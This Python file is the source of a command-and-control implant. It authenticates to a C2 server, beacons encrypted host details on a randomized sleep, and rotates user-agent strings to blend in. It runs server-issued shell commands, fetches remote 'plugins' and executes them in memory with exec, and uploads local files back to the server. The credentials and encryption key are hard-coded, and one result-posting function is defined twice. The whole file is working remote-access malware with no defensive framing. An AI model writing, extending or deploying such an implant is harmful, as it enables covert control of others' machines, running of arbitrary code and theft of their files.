import time
import random
import subprocess
import json
import socket
import getpass
import platform
from cryptography.fernet import Fernet
import importlib.util



SERVER_URL = "http://localhost:5000"
BEACON_ENDPOINT = "/beacon"
RESULT_ENDPOINT = "/result"
UPLOAD_ENDPOINT = "/upload"
LOGIN_ENDPOINT = "/login"

username = "agent2"
password = "pass2"

SLEEP_MIN = 5
SLEEP_MAX = 10

AGENT_ID = "1"


USER_AGENTS = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36"
]


SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
cipher = Fernet(SECRET_KEY)


def encrypt_data(data):
    return cipher.encrypt(data.encode()).decode()


def decrypt_data(data):
    return cipher.decrypt(data.encode()).decode()


def get_system_info():

    return {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "os": platform.system() + " " + platform.release()
    }


def login():
    payload = {
        "username": username,
        "password": password,
        "agent_id": AGENT_ID
    }

    try:
        response = requests.post(
            SERVER_URL + LOGIN_ENDPOINT,
            json=payload,
            timeout=10
        )

        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "agent_logged_in":
                return True

        return False

    except Exception:
        return False



def beacon():

    headers = {"USER-AGENT": random.choice(USER_AGENTS)}

    payload = get_system_info()

    encrypted_payload = encrypt_data(json.dumps(payload))

    try:

        response = requests.post(
            SERVER_URL + BEACON_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

        if response.status_code == 200:

            data = response.json()

            task = data.get("task")
            task_uuid = data.get("uuid")

            if task and task_uuid:
                execute_task(task, task_uuid)

    except Exception as e:
        print(f"[!] Beacon error: {e}")


def execute_task(task, task_uuid):

    task_type = task.get("type")

    print(f"[+] Task Type: {task_type}")

    if task_type == "shell":

        command = task.get("command")
        execute_shell(command, task_uuid)

    elif task_type == "download":

        save_as = task.get("save_as")
        url = task.get("url")
        download_file(url, save_as, task_uuid)

    elif task_type == "upload":

        path_to_file = task.get("path_to_file")
        upload_file(path_to_file, task_uuid)

    elif task_type == "sleep":

        global SLEEP_MIN, SLEEP_MAX

        SLEEP_MIN = task.get("min", SLEEP_MIN)
        SLEEP_MAX = task.get("max", SLEEP_MAX)

        print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")


def execute_shell(command, task_uuid):

    try:

        print(f"[+] Executing: {command}")

        result = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT
        )

        output = result.decode()

        print(output)

        post_result(output, task_uuid)

    except subprocess.CalledProcessError as e:

        post_result(e.output.decode(), task_uuid)


import requests
import importlib.util
import sys

def post_result(output, task_uuid):
    """
    Sends task output back to C2 server
    """
    import json, requests
    data = json.dumps({"uuid": task_uuid, "output": output})
    # Replace with your encryption if used
    requests.post("http://localhost:5000/result", json={"data": data})

def download_file(url, save_as=None, task_uuid=None):
    try:
        print(f"[+] Downloading {url}")
        r = requests.get(url)
        r.raise_for_status()

        if "/plugins" in url:
            content = r.text.replace("\r\n", "\n")
            module_name = url.split("/")[-1].replace(".py", "")
            spec = importlib.util.spec_from_loader(module_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            exec(content, module.__dict__)
            sys.modules[module_name] = module

            if hasattr(module, "run"):
                module.run()
                print(f"[+] Plugin '{module_name}' executed successfully")
                # ✅ Mark task as done immediately
                post_result(f"Plugin '{module_name}' executed", task_uuid)
            else:
                print(f"[!] Plugin '{module_name}' has no run() function")
                post_result(f"Plugin '{module_name}' has no run() function", task_uuid)

        else:
            if save_as is None:
                save_as = url.split("/")[-1]
            with open(save_as, "wb") as f:
                f.write(r.content)
            post_result(f"Downloaded file {save_as}", task_uuid)

    except Exception as e:
        print(f"[!] Error downloading {url}: {e}")
        if task_uuid:
            post_result(f"Error: {e}", task_uuid)


def upload_file(path_to_file, task_uuid):

    headers = {"USER-AGENT": random.choice(USER_AGENTS)}

    try:

        with open(path_to_file, "rb") as file:

            files = {"file": file}

            data = {"agent_id": AGENT_ID}

            response = requests.post(
                SERVER_URL + UPLOAD_ENDPOINT,
                headers=headers,
                files=files,
                data=data
            )

        post_result(
            f"[+] Uploaded {path_to_file} ({response.status_code})",
            task_uuid
        )

    except Exception as e:

        print(f"[!] Upload error: {e}")

        post_result(f"[!] Upload error: {e}", task_uuid)


def post_result(result, task_uuid):

    headers = {"USER-AGENT": random.choice(USER_AGENTS)}

    payload = {
        "id": AGENT_ID,
        "output": result,
        "uuid": task_uuid
    }

    encrypted_payload = encrypt_data(json.dumps(payload))

    try:

        requests.post(
            SERVER_URL + RESULT_ENDPOINT,
            json={"data": encrypted_payload},
            headers=headers
        )

    except Exception as e:

        print(f"[!] Result posting error: {e}")


def main():
    if not login():
        print("[!] Agent login failed")
        return

    print("[+] Agent authenticated")

    while True:
        beacon()
        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
        print(f"[+] Sleeping {sleep_time} seconds")
        time.sleep(sleep_time)



if __name__ == "__main__":
    main()